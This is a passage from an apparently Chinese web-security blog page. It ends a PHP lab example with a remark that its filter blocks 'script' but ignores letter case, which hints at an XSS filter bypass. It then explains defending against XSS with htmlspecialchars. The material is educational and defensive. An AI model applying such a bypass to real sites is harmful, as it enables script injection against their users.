);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>发现过滤了script,但是没有过滤大小写。</p>
<h1 id="防护XSS"><a href="#防护XSS" class="headerlink" title="防护XSS"></a>防护XSS</h1><p>使用函数htmlspecialchars防御XSS<br>htmlspecialchars()函数可以把&amp;.“”、’,&lt;,&gt;这些经常在XSS语句中出现的符号转换为HTML实体。<br>&amp;(和）转成&amp; amp;<br>(双引号)转成&amp;quot<br>&lt;(小于)转成&amp; lt; &gt;(大于)转成 &amp; gt; </p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/page/2/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/4/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2021/07/25/buuctf(%E4%BA%8C)/">buuctf（二）</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2021/07/25/beef/">beef</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2021/07/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">图片隐写</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2021/07/18/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC/">图片木马的制作</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>